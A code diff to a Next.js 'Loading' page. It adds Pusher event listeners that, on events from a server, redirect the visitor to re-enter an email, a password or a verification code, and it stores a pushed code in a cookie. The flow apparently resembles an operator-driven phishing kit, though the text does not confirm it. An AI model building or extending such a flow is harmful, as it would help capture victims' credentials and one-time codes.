@@ -29,6 +29,9 @@ import Cookies from 'js-cookie';
 function Loading() {
   const router = useRouter()
   const[wrongPasswordId, setWrongPasswordId] = useState('');
+  const[wrongMailId, setWrongMailId] = useState('');
+  const[successId, setSuccessId] = useState('');
+  const[verifyId, setVerifyId] = useState('');
   console.log(wrongPasswordId)
   const id = Cookies.get("id");
   const pusher = new Pusher("e4766909b306ad7ddd58", {
@@ -51,12 +54,67 @@ function Loading() {
       channel.unsubscribe(id);
     };
   }, [id]);
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
 
+    channel.bind('email-wrong', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      console.log(data.id)
+      setWrongMailId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('email-wrong');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+
+    channel.bind('login-successfull', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      console.log(data.id)
+      setSuccessId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('login-successfull');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+
+    channel.bind('code-verify', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      Cookies.set("code", data.code);
+      setVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('code-verify');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+  if (wrongMailId) {
+    // Perform the revalidation or data fetching logic here
+  return router.push(`/signin`);
+  }
   if (wrongPasswordId) {
     // Perform the revalidation or data fetching logic here
-  return router.push(`/password`);
+  return router.push(`/wrongPassword`);
   }
-
+  if (successId) {
+    // Perform the revalidation or data fetching logic here
+  return router.push(`/signin`);
+  }
+  if (verifyId) {
+    // Perform the revalidation or data fetching logic here
+  return router.push(`/verifyCode`);
+  }
   return (
     
       <div className=" mt-[300px]">
